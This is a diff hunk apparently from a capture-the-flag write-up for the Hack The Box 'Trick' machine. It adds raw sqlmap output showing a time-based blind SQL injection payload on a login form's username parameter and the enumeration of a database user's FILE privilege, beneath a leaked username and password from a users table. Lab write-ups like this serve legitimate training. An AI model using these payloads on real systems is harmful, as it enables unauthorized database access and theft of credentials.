@@ -322,6 +322,58 @@ Table: users
 
 Enemigosss:SuperGucciRainbowCake
 
+```
+ sqlmap -r req.txt --privilege                        
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___["]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:07:40 /2026-09-17/
+
+[17:07:40] [INFO] parsing HTTP request from 'req.txt'
+[17:07:40] [INFO] resuming back-end DBMS 'mysql' 
+[17:07:40] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 6469 FROM (SELECT(SLEEP(5)))WAoc) AND 'oCFZ'='oCFZ&password=test
+---
+[17:07:41] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[17:07:41] [INFO] fetching database users privileges
+[17:07:41] [INFO] fetching database users
+[17:07:41] [INFO] fetching number of database users
+[17:07:41] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+[17:07:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+1
+[17:07:49] [INFO] retrieved: 
+[17:07:59] [INFO] adjusting time delay to 1 second due to good response times
+'remo'@'localhost'
+[17:09:10] [INFO] fetching number of privileges for user 'remo'
+[17:09:10] [INFO] retrieved: 1
+[17:09:11] [INFO] fetching privileges for user 'remo'
+[17:09:11] [INFO] retrieved: FILE
+database management system users privileges:
+[*] %remo% [1]:
+    privilege: FILE
+
+[17:09:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+[17:09:24] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:09:24 /2026-09-17/
+
+
+```
+
 ---
 ## User Flag
 
